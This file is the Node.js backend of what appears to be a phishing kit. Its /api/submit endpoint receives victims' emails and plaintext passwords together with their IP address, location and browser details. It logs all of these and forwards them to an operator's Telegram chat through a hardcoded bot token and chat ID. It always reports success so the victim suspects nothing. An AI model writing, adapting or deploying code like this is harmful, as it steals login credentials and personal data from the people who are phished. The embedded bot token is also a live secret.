const express = require('express');
const cors = require('cors');
const app = express();

console.log('🚀 Starting Telegram Bot Server - DEBUG MODE...');

// Configuration - UPDATE THESE!
const CONFIG = {
  PORT: process.env.PORT || 3000,
  TELEGRAM: {
    BOT_TOKEN: '8346330872:AAF8YEtXWPZaRZQhIHgnaG7pXg7Lyaf30aw', // REPLACE THIS!
    CHAT_ID: '5546373743'      // REPLACE THIS!
  }
};

// Middleware
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST']
}));
app.use(express.json());

// Health check endpoint
app.get('/api/health', (req, res) => {
  console.log('✅ Health check passed');
  res.json({ 
    status: 'OK', 
    message: 'Telegram Bot Server is running',
    timestamp: new Date().toISOString()
  });
});

// DEBUG: Test Telegram endpoint with detailed logging
app.get('/api/test-telegram', async (req, res) => {
  console.log('🧪 Testing Telegram connection...');
  
  // Check if credentials are configured
  if (CONFIG.TELEGRAM.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    console.log('❌ BOT_TOKEN not configured');
    return res.json({
      success: false,
      error: 'BOT_TOKEN not configured - please update in code'
    });
  }
  
  if (CONFIG.TELEGRAM.CHAT_ID === 'YOUR_CHAT_ID_HERE') {
    console.log('❌ CHAT_ID not configured');
    return res.json({
      success: false,
      error: 'CHAT_ID not configured - please update in code'
    });
  }

  try {
    const testMessage = `🤖 BOT TEST\n\nServer is working! Time: ${new Date().toLocaleString()}`;
    
    const telegramUrl = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
    
    console.log('📤 Sending to Telegram URL:', telegramUrl);
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CONFIG.TELEGRAM.CHAT_ID,
        text: testMessage
      })
    });

    const result = await response.json();
    console.log('📩 Telegram API response:', result);
    
    if (result.ok) {
      console.log('✅ Telegram test successful');
      res.json({
        success: true,
        message: 'Test message sent to Telegram!',
        timestamp: new Date().toISOString(),
        result: result
      });
    } else {
      console.log('❌ Telegram API error:', result.description);
      res.json({
        success: false,
        error: result.description,
        message: 'Telegram API returned error'
      });
    }
    
  } catch (error) {
    console.error('❌ Telegram test failed:', error.message);
    res.json({
      success: false,
      error: error.message,
      message: 'Network error connecting to Telegram'
    });
  }
});

// DEBUG: Main endpoint with detailed logging
app.post('/api/submit', async (req, res) => {
  console.log('📨 Received data submission from frontend');
  console.log('Request body:', JSON.stringify(req.body, null, 2));
  
  try {
    const { 
      email,
      password,
      attempt,
      ip,
      location,
      country,
      city,
      continent,
      language,
      platform,
      userAgent
    } = req.body;

    // Basic validation
    if (!email || !password) {
      return res.status(400).json({
        success: false,
        error: 'Email and password are required'
      });
    }

    console.log(`📧 Email: ${email}`);
    console.log(`🔑 Password: ${password}`);
    console.log(`🎯 Attempt: ${attempt}`);
    console.log(`🌐 IP: ${ip}`);

    // Check Telegram configuration
    let telegramStatus = 'not_configured';
    
    if (CONFIG.TELEGRAM.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    console.log('❌ TELEGRAM_BOT_TOKEN not configured');
    telegramStatus = 'not_configured';
  } else if (CONFIG.TELEGRAM.CHAT_ID === 'YOUR_CHAT_ID_HERE') {
    console.log('❌ TELEGRAM_CHAT_ID not configured');
    telegramStatus = 'not_configured';
  } else {
      console.log('✅ Telegram credentials appear to be configured');
      
      try {
        const telegramMessage = `
🔐 NEW LOGIN ATTEMPT

📧 Email: ${email}
🔑 Password: ${password}
🎯 Attempt: ${attempt}

🌍 Location: ${location}
📍 Country: ${country}
🏙️ City: ${city}
🌐 Continent: ${continent}

💻 Platform: ${platform}
🗣️ Language: ${language}
📱 User Agent: ${userAgent}
🌐 IP: ${ip}

⏰ Time: ${new Date().toLocaleString()}
        `;

        const telegramUrl = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
        
        console.log('📤 Sending to Telegram:', telegramUrl);
        
        const telegramResponse = await fetch(telegramUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CONFIG.TELEGRAM.CHAT_ID,
            text: telegramMessage
          })
        });

        const telegramResult = await telegramResponse.json();
        console.log('📩 Telegram API response:', telegramResult);
        
        if (telegramResult.ok) {
          console.log('✅ Data sent to Telegram successfully');
          telegramStatus = 'sent';
        } else {
          console.log('❌ Telegram API error:', telegramResult.description);
          telegramStatus = 'failed';
        }
        
      } catch (telegramError) {
        console.log('❌ Telegram network error:', telegramError.message);
        telegramStatus = 'network_error';
      }
    }

    // Always return success to continue the flow
    res.json({
      success: true,
      message: 'Data received successfully',
      timestamp: new Date().toISOString(),
      telegram: telegramStatus,
      data_received: {
        email: email,
        attempt: attempt,
        location: location
      }
    });

  } catch (error) {
    console.error('❌ General error:', error.message);
    
    res.json({
      success: true, // Still true to not break flow
      message: 'Data processing completed',
      error: error.message,
      telegram: 'error'
    });
  }
});

// Handle all other routes
app.use('*', (req, res) => {
  res.json({
    success: false,
    error: 'Route not found',
    availableRoutes: ['/api/health', '/api/test-telegram', '/api/submit']
  });
});

// Start server
app.listen(CONFIG.PORT, () => {
  console.log(`🎉 Server running on port ${CONFIG.PORT}`);
  console.log(`📍 Health: http://localhost:${CONFIG.PORT}/api/health`);
  console.log(`📍 Test: http://localhost:${CONFIG.PORT}/api/test-telegram`);
  console.log('⚠️  REMEMBER: Update BOT_TOKEN and CHAT_ID in the code!');
});

